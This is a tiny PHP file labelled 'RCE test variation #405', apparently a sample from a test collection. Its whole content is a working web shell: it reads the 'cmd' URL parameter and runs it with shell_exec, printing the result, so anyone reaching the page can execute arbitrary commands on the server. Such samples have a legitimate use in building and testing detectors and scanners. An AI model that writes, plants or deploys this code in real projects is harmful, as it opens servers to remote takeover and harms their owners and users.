<?php
// RCE test variation #405
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>